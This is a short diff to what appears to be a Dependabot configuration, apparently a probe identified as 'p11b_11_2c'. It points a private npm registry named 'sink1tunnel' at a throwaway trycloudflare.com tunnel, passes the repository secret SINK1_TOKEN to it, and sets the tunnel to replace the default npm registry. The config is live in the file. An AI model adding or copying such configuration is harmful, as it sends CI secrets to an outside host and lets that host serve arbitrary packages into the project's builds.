@@ -1,9 +1,9 @@
-# p7r p11b_11_2b 1790589068
+# p7r p11b_11_2c 1790589183
 version: 2
 registries:
   sink1tunnel:
     type: npm-registry
-    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/p11/chunked
+    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/p11/gzip
     token: ${{secrets.SINK1_TOKEN}}
     replaces-base: true
 updates:
